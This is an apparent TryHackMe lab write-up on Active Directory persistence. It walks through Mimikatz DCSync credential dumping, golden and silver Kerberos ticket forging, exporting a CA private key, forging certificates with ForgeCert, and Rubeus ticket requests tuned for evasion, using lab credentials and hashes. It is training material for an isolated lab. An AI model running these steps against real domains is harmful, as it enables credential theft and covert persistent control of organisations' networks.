# Persisting Active Directory

**Room Link:** [https://tryhackme.com/room/persistingad](https://tryhackme.com/room/persistingad)

## Introduction

**Kali**

```
systemd-resolve --interface persistad --set-dns $THMDCIP --set-domain za.tryhackme.loc
nslookup thmdc.za.tryhackme.loc
```



## Persistence through Credentials

**Kali**

```
ssh Administrator@thmwrk1.za.tryhackme.loc
Password: tryhackmewouldnotguess1@
```

**Kali**

```
xfreerdp +clipboard /u:"Administrator" /v:thmwrk1.za.tryhackme.loc:3389 /size:1024x568 /smart-sizing:800x1200
Password: tryhackmewouldnotguess1@
```

### DCSync All

**Victim(cmd)**

```
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

You will see quite a bit of output, including the current NTLM hash of your account. You can verify that the NTLM hash is correct by using a [website such as this](https://codebeautify.org/ntlm-hash-generator) to transform your password into an NTLM hash.

This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on Mimikatz.

**Victim(mimikatz)**

```
lsadump::dcsync /domain:za.tryhackme.loc /user:$YourLow-privilegeADUsername
log $username_dcdump.txt
```

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Now, instead of specifying our account, we will use the /all flag:

**Victim(mimikatz)**

```
lsadump::dcsync /domain:za.tryhackme.loc /all
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

**What is the NTLM hash associated with the krbtgt user?**

**Victim(mimikatz)**

```
lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Persistence through Tickets

### Forging Tickets for Fun and Profit

Now that we have explained the basics for Golden and Silver Tickets, let's generate some. You will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync performed in the previous task. Furthermore, make a note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. You can find this information in the DC dump that you performed. The last piece of information we need is the Domain SID. Using our low-privileged SSH terminal on THMWRK1, we can use the AD-RSAT cmdlet to recover this information.

**Victim(powershell)**

```
powershell
Get-ADDomain
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Victim(powershell)**

```
exit
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

Once Mimikatz is loaded, perform the following to generate a golden ticket.

Parameters explained:

* /admin - The username we want to impersonate. This does not have to be a valid user.
* /domain - The FQDN of the domain we want to generate the ticket for.
* /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
* /sid -The SID of the domain we want to generate the ticket for.
* /krbtgt -The NTLM hash of the KRBTGT account.
* /endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
* /renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
* /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

**Victim(mimikatz)**

```
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

We can verify that the golden ticket is working by running the dir command against the domain controller.

**Victim(cmd)**

```
dir \\thmdc.za.tryhackme.loc\c$\
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice. If we really want to dig in our roots, we want to generate silver tickets, which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. We can use the following Mimikatz command to generate a silver ticket.

**Victim(mimikatz)**

```
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:$DomainSID /target:$HostnameOfServerBeingTargeted /rc4:$NTLMHashOfMachineAccountOfTarget /service:cifs /ptt
```

## Persistence through Certificates

### Extracting the Private Key

The private key of the CA is stored on the CA server itself. If the private key is not protected through hardware-based protection methods such as an Hardware Security Module (HSM), which is often the case for organisations that just use Active Directory Certificate Services (AD CS) for internal purposes, it is protected by the machine Data Protection API (DPAPI). This means we can use tools such as Mimikatz and SharpDPAPI to extract the CA certificate and thus the private key from the CA. Mimikatz is the simplest tool to use, but if you want to experience other tools, have a look [here](https://pentestlab.blog/2021/11/15/golden-certificate/). Use SSH to authenticate to THMDC.za.tryhackme.loc using the Administrator credentials from Task 2, create a unique directory for your user, move to it, and load Mimikatz.

**Kali**

```
ssh Administrator@thmrootdc.za.tryhackme.loc
Password: tryhackmewouldnotguess1@
```

**Victim(cmd) - THMDC**

```
mkdir epic
cd epic
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

Let's first see if we can view the certificates stored on the DC.

**Victim(mimikatz) - THMDC**

```
crypto::certificates /systemstore:local_machine
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

We can see that there is a CA certificate on the DC. We can also note that some of these certificates were set not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable.

**Victim(mimikatz) - THMDC**

```
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /export
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Victim(cmd) - THMDC**

```
dir
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Generating our own Certificates

Now that we have the private key and root CA certificate, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a Client Authenticate certificate for any user we want. The ForgeCert and Rubeus binaries are stored in the C:\Tools\ directory on THMWRK1. Let's use ForgeCert to generate a new certificate:

**Victim(cmd) - THMWRK1**

```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

Parameters explained:

* CaCertPath - The path to our exported CA certificate.
* CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
* Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
* SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
* NewCertPath - The path to where ForgeCert will store the generated certificate.
* NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:

**Victim(cmd) - THMWRK1**

```
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

Let's break down the parameters:

* /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
* /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
* /certificate - Path to the certificate we have generated
* /password - The password for our certificate file
* /outfile - The file where our TGT will be output to
* /domain - The FQDN of the domain we are currently attacking
* /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

### Generating our own Certificates

Now that we have the private key and root CA certificate, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a Client Authenticate certificate for any user we want. The ForgeCert and Rubeus binaries are stored in the C:\Tools\ directory on THMWRK1. Let's use ForgeCert to generate a new certificate.

**Victim(cmd) - THMWRK1**

```
C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

Parameters explained:

* CaCertPath - The path to our exported CA certificate.
* CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
* Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
* SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
* NewCertPath - The path to where ForgeCert will store the generated certificate.
* NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

We can use Rubeus to request a TGT using the certificate to verify that the certificate is trusted. We will use the following command:

**Victim(cmd) - THMWRK1**

```
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

Let's break down the parameters:

* /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
* /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
* /certificate - Path to the certificate we have generated
* /password - The password for our certificate file
* /outfile - The file where our TGT will be output to
* /domain - The FQDN of the domain we are currently attacking
* /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

Once we execute the command, we should receive our TGT:

**Victim(cmd) - THMWRK1**

```
C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
```

Now we can use Mimikatz to load the TGT and authenticate to THMDC:

**Victim(cmd) - THMWRK1**

```
C:\Tools\mimikatz_trunk\Win32\mimikatz.exe
```

**Victim(mimikatz) - THMWRK1**

```
kerberos::ptt administrator.kirbi
```

**Victim(cmd) - THMWRK1**

```
dir \\THMDC.za.tryhackme.loc\c$\
```
